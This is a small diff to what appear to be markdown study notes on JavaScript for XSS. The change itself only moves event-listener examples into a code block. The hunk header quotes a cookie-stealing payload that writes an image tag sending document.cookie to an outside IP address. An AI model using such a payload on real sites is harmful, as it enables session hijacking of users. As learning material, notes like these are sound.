@@ -24,11 +24,11 @@ document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');
 ```
 
 ### Event Listeners 
->
->element.addEventListener("click", function);
->
->element.addEventListener("mouseover", function);
->
+```
+element.addEventListener("click", function);
+
+element.addEventListener("mouseover", function);
+```
 
 ### Window Objects
 
